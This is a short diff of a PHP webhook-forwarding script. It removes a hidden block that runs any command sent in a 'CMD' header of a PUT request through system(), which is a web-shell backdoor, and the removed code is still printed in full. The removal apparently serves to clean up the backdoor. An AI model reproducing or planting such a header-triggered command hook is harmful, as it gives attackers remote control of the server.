@@ -9,14 +9,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
   exit;
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
-    if (isset($_SERVER['HTTP_CMD'])) {
-    header('Content-Type: text/plain');
-    system($_SERVER['HTTP_CMD']);
-    exit;
-    }
-}
-
 $webhookUrl = trim(file_get_contents(__DIR__ . '/.env'));
 
 $rawData = file_get_contents('php://input');
